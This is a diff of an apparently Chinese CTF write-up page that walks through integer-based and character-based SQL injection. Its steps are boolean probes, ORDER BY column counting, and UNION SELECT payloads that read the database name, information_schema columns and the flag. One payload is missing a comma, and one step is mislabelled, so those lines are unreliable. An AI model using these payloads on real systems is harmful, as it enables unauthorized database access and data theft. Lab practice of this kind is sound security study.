@@ -396,7 +396,7 @@
 <p>输入<code>1</code>，执行成功。   输入<code>1 and 1=1</code>，执行成功。 输入<code>1 and 1=2</code>执行失败。 推断为整数型注入</p>
 <p>接着通过<code>1 order by 1</code>,<code>1 order by 2</code>,<code>1 order by 3</code>,来判断字段数。</p>
 <p>爆破数据库：<code>-1 union select 1,database()</code>   以<code>sqli</code>为例</p>
-<p>爆破sqli中的表名：<code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=flag</code> </p>
+<p>爆破sqli中的表名：<code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code> </p>
 <p>最后读取flag：<code>-1 union select 1 group_concat(flag)from sqli.flag</code></p>
 <h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><p>输入<code>1</code>，执行成功。   输入<code>1 and 1=1</code>，执行成功。 输入<code>1 and 1=2</code>执行成功。不是整数型注入 </p>
 <p>考虑是否为字符型注入执行<code>&#39;union select 1,database() -- &#39;</code>爆破出数据库sqli</p>
